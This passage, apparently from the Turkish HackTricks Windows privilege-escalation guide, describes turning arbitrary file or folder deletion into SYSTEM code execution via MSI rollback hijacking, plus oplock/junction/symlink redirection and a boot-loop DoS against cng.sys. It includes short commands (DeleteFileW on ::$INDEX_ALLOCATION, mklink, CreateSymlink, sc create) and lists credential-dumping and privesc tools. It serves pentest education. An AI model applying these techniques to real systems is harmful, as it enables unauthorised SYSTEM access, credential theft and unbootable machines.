Ardından **UAC ve UAC bypass'leri hakkında bilgi edinmek için bunu okuyun:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Arbitrary Folder Delete/Move/Rename'den SYSTEM EoP'ye

[**Bu blog gönderisinde**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) açıklanan teknik, exploit kodu [**burada mevcuttur**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Saldırı temel olarak Windows Installer'ın rollback özelliğini abuse ederek uninstall işlemi sırasında legitimate dosyaları malicious dosyalarla değiştirmeye dayanır. Bunun için attacker'ın, diğer MSI paketlerinin uninstall işlemi sırasında rollback dosyalarını depolamak üzere Windows Installer tarafından kullanılacak `C:\Config.Msi` klasörünü hijack etmek amacıyla kullanılacak bir **malicious MSI installer** oluşturması gerekir. Bu rollback dosyaları daha sonra malicious payload içerecek şekilde değiştirilir.

Özetlenen teknik aşağıdaki gibidir:

1. **Stage 1 – Hijack için hazırlık (`C:\Config.Msi` klasörünü boş bırakın)**

- Step 1: MSI'ı yükleyin
- Yazılabilir bir klasöre (`TARGETDIR`) zararsız bir dosya (ör. `dummy.txt`) yükleyen bir `.msi` oluşturun.
- Installer'ı **"UAC Compliant"** olarak işaretleyin; böylece bir **non-admin user** bunu çalıştırabilir.
- Install işleminden sonra dosyaya ait bir **handle** açık tutun.

- Step 2: Uninstall işlemini başlatın
- Aynı `.msi` dosyasını uninstall edin.
- Uninstall işlemi dosyaları `C:\Config.Msi` klasörüne taşımaya ve bunları `.rbf` dosyaları (rollback backup'ları) olarak yeniden adlandırmaya başlar.
- Dosya `C:\Config.Msi\<random>.rbf` olduğunda bunu tespit etmek için açık dosya **handle**'ını `GetFinalPathNameByHandle` kullanarak **poll** edin.

- Step 3: Custom Syncing
- `.msi`, aşağıdakileri yapan bir **custom uninstall action (`SyncOnRbfWritten`)** içerir:
- `.rbf` yazıldığında sinyal verir.
- Ardından uninstall işlemine devam etmeden önce başka bir event üzerinde **wait** eder.

- Step 4: `.rbf` dosyasının silinmesini engelleyin
- Sinyal alındığında, `.rbf` dosyasını `FILE_SHARE_DELETE` olmadan **open** edin — bu, dosyanın silinmesini **engeller**.
- Ardından uninstall işleminin tamamlanabilmesi için geri sinyal gönderin.
- Windows Installer `.rbf` dosyasını silemez ve tüm içeriği silemediği için `C:\Config.Msi` kaldırılmaz.

- Step 5: `.rbf` dosyasını manuel olarak silin
- Siz (attacker) `.rbf` dosyasını manuel olarak silin.
- Artık `C:\Config.Msi` boştur ve hijack edilmeye hazırdır.

> Bu noktada, `C:\Config.Msi` klasörünü silmek için **SYSTEM-level arbitrary folder delete vulnerability**'yi tetikleyin.

2. **Stage 2 – Rollback script'lerini malicious olanlarla değiştirme**

- Step 6: `C:\Config.Msi` klasörünü zayıf ACL'lerle yeniden oluşturun
- `C:\Config.Msi` klasörünü kendiniz yeniden oluşturun.
- **Weak DACL**'ler (ör. Everyone:F) ayarlayın ve `WRITE_DAC` içeren bir **handle**'ı açık tutun.

- Step 7: Başka bir install çalıştırın
- `.msi` dosyasını aşağıdakilerle tekrar install edin:
- `TARGETDIR`: Yazılabilir konum.
- `ERROROUT`: Forced failure tetikleyen bir variable.
- Bu install, `.rbs` ve `.rbf` dosyalarını tekrar okuyan **rollback** işlemini tetiklemek için kullanılacaktır.

- Step 8: `.rbs` için monitor edin
- Yeni bir `.rbs` görünene kadar `C:\Config.Msi` klasörünü monitor etmek için `ReadDirectoryChangesW` kullanın.
- Dosya adını yakalayın.

- Step 9: Rollback öncesinde sync
- `.msi`, aşağıdakileri yapan bir **custom install action (`SyncBeforeRollback`)** içerir:
- `.rbs` oluşturulduğunda bir event sinyali verir.
- Ardından devam etmeden önce **wait** eder.

- Step 10: Weak ACL'yi yeniden uygulayın
- `.rbs created` event'ini aldıktan sonra:
- Windows Installer, `C:\Config.Msi` klasörüne **strong ACL**'leri yeniden uygular.
- Ancak hâlâ `WRITE_DAC` içeren bir handle'a sahip olduğunuz için **weak ACL**'leri tekrar uygulayabilirsiniz.

> ACL'ler **yalnızca handle open sırasında uygulanır**; bu nedenle klasöre hâlâ yazabilirsiniz.

- Step 11: Sahte `.rbs` ve `.rbf` dosyalarını bırakın
- `.rbs` dosyasını, Windows'a aşağıdakileri söyleyen **fake rollback script** ile overwrite edin:
- `.rbf` dosyanızı (malicious DLL) **privileged location**'a geri yükleyin (ör. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- **Malicious SYSTEM-level payload DLL** içeren fake `.rbf` dosyanızı bırakın.

- Step 12: Rollback'i tetikleyin
- Installer'ın devam etmesi için sync event'ine sinyal gönderin.
- Bir **type 19 custom action (`ErrorOut`)**, install işlemini bilinen bir noktada **intentionally fail** edecek şekilde yapılandırılmıştır.
- Bu, **rollback** işleminin başlamasına neden olur.

- Step 13: SYSTEM DLL'nizi install eder
- Windows Installer:
- Malicious `.rbs` dosyanızı okur.
- `.rbf` DLL'nizi target location'a kopyalar.
- Artık **SYSTEM tarafından yüklenen bir path'te malicious DLL'niz** vardır.

- Final Step: SYSTEM kodunu execute edin
- Hijack ettiğiniz DLL'yi load eden trusted bir **auto-elevated binary** (ör. `osk.exe`) çalıştırın.
- **Boom**: Kodunuz **SYSTEM olarak** execute edilir.


### Arbitrary File Delete/Move/Rename'den SYSTEM EoP'ye

Ana MSI rollback tekniği (önceki teknik), **entire folder**'ı (ör. `C:\Config.Msi`) silebildiğinizi varsayar. Ancak vulnerability yalnızca **arbitrary file deletion**'a izin veriyorsa ne olur?

**NTFS internals**'ı exploit edebilirsiniz: Her klasörde şu adla gizli bir alternate data stream bulunur:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Bu stream, klasörün **index metadata** bilgilerini depolar.

Bu nedenle, bir klasörün **`::$INDEX_ALLOCATION` stream**'ini **silerseniz**, NTFS klasörün tamamını dosya sisteminden **kaldırır**.

Bunu aşağıdaki gibi standart dosya silme API'lerini kullanarak yapabilirsiniz:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Bir *file* delete API'si çağırıyor olsanız bile, **folder'ın kendisini siler**.

### Folder Contents Delete'ten SYSTEM EoP'ye
Primitive'iniz rastgele file/folder'ları silmenize izin vermiyor, ancak **saldırganın kontrolündeki bir folder'ın *contents* bölümünü silmenize izin veriyorsa** ne olur?

1. Step 1: Bir bait folder ve file ayarlayın
- Oluşturun: `C:\temp\folder1`
- İçine: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` üzerine bir **oplock** yerleştirin
- Oplock, ayrıcalıklı bir process `file1.txt` dosyasını silmeye çalıştığında **execution'ı duraklatır**.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Adım 3: SYSTEM process'ini tetikleyin (ör. `SilentCleanup`)
- Bu process klasörleri (ör. `%TEMP%`) tarar ve içeriklerini silmeye çalışır.
- `file1.txt` dosyasına ulaştığında **oplock tetiklenir** ve kontrolü callback'inize aktarır.

4. Adım 4: Oplock callback'i içinde – silme işlemini yeniden yönlendirin

- Seçenek A: `file1.txt` dosyasını başka bir yere taşıyın
- Bu işlem, oplock'i bozmadan `folder1` klasörünü boşaltır.
- `file1.txt` dosyasını doğrudan silmeyin — bu, oplock'in zamanından önce serbest bırakılmasına neden olur.

- Seçenek B: `folder1` klasörünü bir **junction**'a dönüştürün:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Seçenek C: `\RPC Control` içinde bir **symlink** oluşturun:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Bu, klasör meta verilerini depolayan NTFS dahili stream'ini hedefler — bunu silmek klasörü siler.

5. Adım 5: Oplock'i serbest bırakma
- SYSTEM işlemi devam eder ve `file1.txt` dosyasını silmeye çalışır.
- Ancak şimdi junction + symlink nedeniyle aslında şunu siliyor:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Sonuç**: `C:\Config.Msi`, SYSTEM tarafından silinir.

### Rastgele Klasör Oluşturmadan Kalıcı DoS'a

**Dosya yazamıyor** veya **zayıf izinler ayarlayamıyor** olsanız bile, **SYSTEM/admin olarak rastgele bir klasör oluşturmanıza** olanak tanıyan bir primitive'i exploit edin.

**Kritik bir Windows driver'ının** adıyla bir **klasör** (dosya değil) oluşturun; örneğin:
```
C:\Windows\System32\cng.sys
```
- Bu yol normalde `cng.sys` kernel-mode driver'ına karşılık gelir.
- Bunu **önceden bir klasör olarak oluşturursanız**, Windows boot sırasında gerçek driver'ı yükleyemez.
- Ardından Windows, boot sırasında `cng.sys` dosyasını yüklemeye çalışır.
- Klasörü görür, **gerçek driver'ı çözümleyemez** ve **boot işlemi çöker veya durur**.
- **Fallback yoktur** ve harici müdahale (ör. boot repair veya diske erişim) olmadan **recovery mümkün değildir**.

### Ayrıcalıklı log/backup yollarından + OM symlink'lerinden rastgele dosya üzerine yazma / boot DoS'a

Bir **ayrıcalıklı servis**, log/export işlemlerini **yazılabilir bir config** dosyasından okunan bir yola yazdığında, bu yolu **Object Manager symlinks + NTFS mount points** ile yönlendirerek ayrıcalıklı yazma işlemini rastgele bir dosyanın üzerine yazmaya dönüştürebilirsiniz (hatta **SeCreateSymbolicLinkPrivilege olmadan bile**).<sup>[[15]](#references)</sup>

**Gereksinimler**
- Hedef yolu saklayan config'in attacker tarafından yazılabilir olması (ör. `%ProgramData%\...\.ini`).
- `\RPC Control` için bir mount point ve bir OM file symlink oluşturabilme (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Bu yola yazan ayrıcalıklı bir işlem (log, export, report).

**Örnek zincir**
1. Ayrıcalıklı log hedefini kurtarmak için config'i okuyun; ör. `C:\ProgramData\ICONICS\IcoSetup64.ini` içindeki `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`.
2. Yolu admin olmadan yönlendirin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Yetkili bileşenin log'u yazmasını bekleyin (ör. admin "send test SMS" işlemini tetikler). Yazma işlemi artık `C:\Windows\System32\cng.sys` konumuna gerçekleşir.
4. Üzerine yazılan hedefi (hex/PE parser) inceleyerek bozulmayı doğrulayın; yeniden başlatma, Windows'un değiştirilmiş driver path'ini yüklemesini zorlar → **boot loop DoS**. Bu yöntem, yetkili bir service'in yazma amacıyla açacağı tüm korumalı dosyalara da uygulanabilir.

> `cng.sys` normalde `C:\Windows\System32\drivers\cng.sys` konumundan yüklenir; ancak `C:\Windows\System32\cng.sys` konumunda bir kopya varsa öncelikle bu kopyanın yüklenmesi denenebilir. Bu da bozuk veriler için güvenilir bir DoS hedefi oluşturur.



## **High Integrity'den System'e**

### **Yeni service**

Zaten bir High Integrity process üzerinde çalışıyorsanız, yalnızca yeni bir service **oluşturup çalıştırarak** **SYSTEM'e giden path** kolay olabilir:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Bir service binary oluştururken bunun geçerli bir service olduğundan veya binary'nin gerekli işlemleri yeterince hızlı gerçekleştirdiğinden emin olun; geçerli bir service değilse 20 saniye içinde sonlandırılır.

### AlwaysInstallElevated

Bir High Integrity process'ten **AlwaysInstallElevated registry girdilerini etkinleştirmeyi** ve bir _**.msi**_ wrapper kullanarak bir reverse shell **kurmayı** deneyebilirsiniz.\
[İlgili registry anahtarları ve bir _.msi_ package'ın nasıl kurulacağı hakkında daha fazla bilgi burada.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Koda** [**buradan ulaşabilirsiniz**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Bu token privilege'larına sahipseniz (muhtemelen bunu zaten High Integrity olan bir process'te bulacaksınız), SeDebug privilege'ı ile (protected process'ler dışındaki) **neredeyse tüm process'leri açabilecek**, process'in **token'ını kopyalayabilecek** ve bu token ile **arbitrary bir process oluşturabileceksiniz**.\
Bu teknik kullanılırken genellikle **tüm token privilege'larına sahip SYSTEM olarak çalışan bir process seçilir** (_evet, tüm token privilege'larına sahip olmayan SYSTEM process'leri bulabilirsiniz_).\
**Önerilen tekniği uygulayan bir kod örneğini** [**burada bulabilirsiniz**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Bu teknik, meterpreter tarafından `getsystem` içinde privilege escalation yapmak için kullanılır. Teknik, **bir pipe oluşturup ardından bu pipe'a yazmak için bir service oluşturulması veya mevcut bir service'in abuse edilmesinden** oluşur. Daha sonra, **`SeImpersonate`** privilege'ını kullanarak pipe'ı oluşturan **server**, pipe client'ının (service) **token'ını impersonate edebilecek** ve SYSTEM privilege'ları elde edecektir.\
Name pipe'lar hakkında [**daha fazla bilgi edinmek istiyorsanız bunu okuyun**](#named-pipe-client-impersonation).\
Name pipe'ları kullanarak high integrity'den System'e **nasıl geçileceğine dair bir örnek** okumak istiyorsanız [**bunu okuyun**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

**SYSTEM** olarak çalışan bir **process** tarafından **yüklenen** bir dll'yi **hijack etmeyi** başarırsanız, bu permission'larla arbitrary code çalıştırabilirsiniz. Bu nedenle Dll Hijacking, bu tür privilege escalation için de kullanışlıdır; ayrıca, dll'leri yüklemek için kullanılan folder'larda **write permission'larına** sahip olacağından, **high integrity process'ten gerçekleştirilmesi çok daha kolaydır**.\
**Dll hijacking hakkında** [**daha fazla bilgi edinebilirsiniz**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Okuyun:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Daha fazla yardım

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Kullanışlı araçlar

**Windows local privilege escalation vector'lerini bulmak için en iyi tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Misconfiguration'ları ve sensitive file'ları kontrol eder (**[**buraya bakın**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Tespit edildi.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Bazı olası misconfiguration'ları kontrol eder ve bilgi toplar (**[**buraya bakın**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Misconfiguration'ları kontrol eder**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla ve RDP'nin kaydedilmiş session bilgilerini çıkarır. Local kullanımda -Thorough kullanın.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager'dan credential'ları çıkarır. Tespit edildi.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Toplanan password'ları domain genelinde spray eder**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh, PowerShell ADIDNS/LLMNR/mDNS spoofer'ı ve man-in-the-middle tool'udur.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Temel privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Bilinen privesc vulnerability'lerini arar (Watson için DEPRECATED)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local kontroller **(Admin rights gerekir)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Bilinen privesc vulnerability'lerini arar (VisualStudio kullanılarak compile edilmesi gerekir) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Misconfiguration'ları aramak için host'u enumerate eder (privesc tool'undan çok bilgi toplama tool'udur) (compile edilmesi gerekir) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Çok sayıda software'den credential'ları çıkarır (github'da precompiled exe)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp'ın C# port'u**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Misconfiguration kontrolü yapar (github'da executable precompiled olarak bulunur). Önerilmez. Win10'da iyi çalışmaz.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Olası misconfiguration'ları kontrol eder (Python'dan üretilmiş exe). Önerilmez. Win10'da iyi çalışmaz.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Bu post temel alınarak oluşturulmuş tool (düzgün çalışmak için accesschk erişimi gerektirmez, ancak bunu kullanabilir).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** çıktısını okur ve çalışan exploit'leri önerir (local Python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** çıktısını okur ve çalışan exploit'leri önerir (local Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Projeyi doğru .NET sürümünü kullanarak compile etmelisiniz ([**buraya bakın**](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Victim host'ta kurulu .NET sürümünü görmek için şunu çalıştırabilirsiniz:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## References

- [1] [Windows Privilege Escalation Temelleri](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Zayıf klasör izinlerinden yararlanarak yetkileri yükseltme](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation - bir cheatsheet](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Windows / Linux Local Privilege Escalation Workshop](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows Attacks: AT is the new black (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation - Windows - Total OSCP Guide](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Privilege Escalation - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Windows Privilege Escalation Rehberi](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows-Privilege-Escalation kontrol listesi](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Pentesters için Windows Privilege Escalation Methods](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: SMTP üzerinden Word VBA macro phishing → hMailServer kimlik bilgisi decryption → SYSTEM için Veeam CVE-2023-27532](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) ve kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Silver Fox'un Peşinde: Kernel Shadows'ta Kedi ve Fare](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Bir SCADA Sisteminde Bulunan Privileged File System Vulnerability](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Symbolic Link Testing Tools – CreateSymlink kullanımı](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Geçmişe Bir Link. Windows'ta Symbolic Links Kötüye Kullanımı](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Windows'ta Dangerous Module Resolution](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js modules: `node_modules` klasörlerinden loading](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - C/C++ checklist challenges, solved](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - RtlQueryRegistryValues function](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own with Microslop: Windows LPE için CLDFLT ve DirectX Kernel Race Conditions zincirleme kullanımı](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [One I/O Ring to Rule Them All: Windows 11'de Tam Read/Write Exploit Primitive](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Arbitrary File Deletes Kötüye Kullanılarak Privilege Escalation ve Diğer Harika Tricks](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - FilesystemEoPs exploit code](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS Attacks Part 2: CVE-2020-1013, bir Windows 10 Local Privilege Escalation 1-Day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Credential Manager ve Windows Vault'u İnceleme](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Image Change Privilege Escalation'a Yol Açtığında Kerberos Resource Based Constrained Delegation](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Windows 10 Ssh Agent'tan Ssh Private Keys Extracting](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
{{#include ../../banners/hacktricks-training.md}}
